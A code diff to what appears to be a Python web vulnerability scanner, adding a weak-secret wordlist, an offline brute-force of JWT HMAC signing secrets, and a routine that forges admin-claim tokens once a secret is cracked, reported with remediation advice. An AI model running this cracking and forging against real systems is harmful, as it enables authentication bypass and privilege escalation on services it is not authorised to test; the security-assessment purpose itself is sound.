@@ -14,6 +14,8 @@ from __future__ import annotations
 
 import base64
 import difflib
+import hashlib
+import hmac
 import http.client
 import json
 import re
@@ -856,6 +858,66 @@ def _prove_jwt_none(ip: str, port: Port, path: str, loc: str, cookie_name, token
             f"and anonymous baselines ({lens}); couldn't classify. Confirm with jwt_tool -X a.")
 
 
+# Common HMAC secrets to try against an HS256/384/512 JWT (offline, instant). The
+# short list catches the overwhelmingly common "weak/default secret" case; a real
+# engagement extends it with a wordlist (jwt_tool / hashcat -m 16500).
+_JWT_SECRETS = [
+    "secret", "secretkey", "secret_key", "jwt_secret", "jwtsecret", "jwt", "key",
+    "password", "changeme", "change_me", "admin", "test", "123456", "1234567890",
+    "qwerty", "supersecret", "super_secret", "mysecret", "my_secret", "s3cr3t",
+    "secret123", "password123", "default", "your-256-bit-secret", "your-secret-key",
+    "your_jwt_secret", "topsecret", "letmein", "private", "token", "auth", "hmac",
+    "signingkey", "signing_key", "app_secret", "appsecret", "sekret", "secretsecret",
+    "access_token_secret", "refresh_token_secret", "0000", "null", "undefined",
+]
+_HS_HASH = {"hs256": hashlib.sha256, "hs384": hashlib.sha384, "hs512": hashlib.sha512}
+
+
+def _jwt_crack_hs(token: str, extra_secrets=None) -> str | None:
+    """Offline HMAC brute of an HS* JWT against the built-in list (+ any extra secrets,
+    e.g. engagement-harvested). Returns the signing secret if found, else None. The
+    HMAC check is exact, so a hit IS the secret - no false positive."""
+    parts = token.split(".")
+    if len(parts) != 3:
+        return None
+    h = _HS_HASH.get(_jwt_alg(token) or "")
+    if h is None:
+        return None
+    sig = _b64url(parts[2])
+    if not sig:
+        return None
+    signing_input = f"{parts[0]}.{parts[1]}".encode()
+    for secret in list(_JWT_SECRETS) + list(extra_secrets or []):
+        if not secret:
+            continue
+        if hmac.compare_digest(hmac.new(secret.encode(), signing_input, h).digest(), sig):
+            return secret
+    return None
+
+
+def _forge_hs(token: str, secret: str, extra_claims: dict) -> str | None:
+    """Forge a token from `token`'s claims (+ extra_claims) signed with `secret` - a
+    ready proof that the recovered secret grants arbitrary tokens."""
+    parts = token.split(".")
+    alg = _jwt_alg(token) or "hs256"
+    h = _HS_HASH.get(alg)
+    payraw = _b64url(parts[1]) if len(parts) > 1 else None
+    if h is None or payraw is None:
+        return None
+    try:
+        claims = json.loads(payraw)
+    except (ValueError, TypeError):
+        return None
+    if not isinstance(claims, dict):
+        return None
+    claims = {**claims, **extra_claims}
+    head = _b64url_enc(json.dumps({"alg": alg.upper(), "typ": "JWT"},
+                                  separators=(",", ":")).encode())
+    pay = _b64url_enc(json.dumps(claims, separators=(",", ":")).encode())
+    sig = _b64url_enc(hmac.new(secret.encode(), f"{head}.{pay}".encode(), h).digest())
+    return f"{head}.{pay}.{sig}"
+
+
 def _scan_jwts(ip: str, port: Port, headers: dict, body: str,
                active: bool = False) -> list[Vuln]:
     out: list[Vuln] = []
@@ -894,12 +956,32 @@ def _scan_jwts(ip: str, port: Port, headers: dict, body: str,
             continue
         seen_alg.add(alg)
         if alg.startswith("hs"):
-            out.append(_mk(ip, port, "web-jwt", "low",
-                           f"JWT uses symmetric {alg.upper()} (offline-crackable secret)", ["CWE-347"],
-                           f"JWT header alg={alg.upper()} ({red}). If the HMAC secret is weak it "
-                           "cracks offline, letting you forge tokens.",
-                           "Use a long random secret (or RS256); rotate it.",
-                           confidence="potential"))
+            cracked = _jwt_crack_hs(tok)
+            if cracked:
+                forged = _forge_hs(tok, cracked, {"admin": True, "role": "admin",
+                                                  "recce": 1})
+                pocline = (f"  Forged admin token (verify with the same secret): {forged}"
+                           if forged else "")
+                out.append(_mk(
+                    ip, port, "web-jwt", "critical",
+                    f"JWT HMAC secret cracked ('{cracked}') - forge arbitrary tokens",
+                    ["CWE-347", "CWE-1391"],
+                    f"The {alg.upper()} JWT ({red}) is signed with the weak secret "
+                    f"'{cracked}', recovered by offline HMAC brute force. With the secret "
+                    "an attacker forges ANY token - set admin/other-user claims for a "
+                    "complete authentication bypass / privilege escalation." + pocline,
+                    "Use a long random secret (>=32 random bytes) or an asymmetric "
+                    "algorithm (RS256); rotate the compromised secret and invalidate "
+                    "issued tokens.", confidence="confirmed"))
+            else:
+                out.append(_mk(ip, port, "web-jwt", "low",
+                               f"JWT uses symmetric {alg.upper()} (offline-crackable secret)",
+                               ["CWE-347"],
+                               f"JWT header alg={alg.upper()} ({red}). The built-in weak-secret "
+                               "list didn't crack it; try a full wordlist (hashcat -m 16500 / "
+                               "jwt_tool). A weak HMAC secret lets you forge tokens.",
+                               "Use a long random secret (or RS256); rotate it.",
+                               confidence="potential"))
         elif alg.startswith(("rs", "es", "ps")):
             out.append(_mk(ip, port, "web-jwt", "info",
                            f"JWT uses {alg.upper()} (check RS256->HS256 key-confusion)", ["CWE-347"],
